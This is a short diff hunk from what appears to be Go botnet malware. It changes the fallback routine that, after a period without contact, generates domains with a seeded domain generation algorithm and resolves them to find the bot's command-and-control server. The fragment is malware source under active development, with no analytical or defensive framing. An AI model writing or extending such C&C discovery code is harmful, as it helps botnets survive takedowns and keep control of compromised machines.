@@ -127,7 +127,7 @@ func main() {
 		// Check if DGA should kick it.
 		if timeSinceJesus()-lastContactMade > dgaAfterDays {
 			// Try to find the Atila (cnc) behind a generated domain.
-			for _, host := range dga() {
+			for _, host := range dga(dgaSeed) {
 				if _, err := net.LookupIP(host); err != nil {
 					continue
 				}
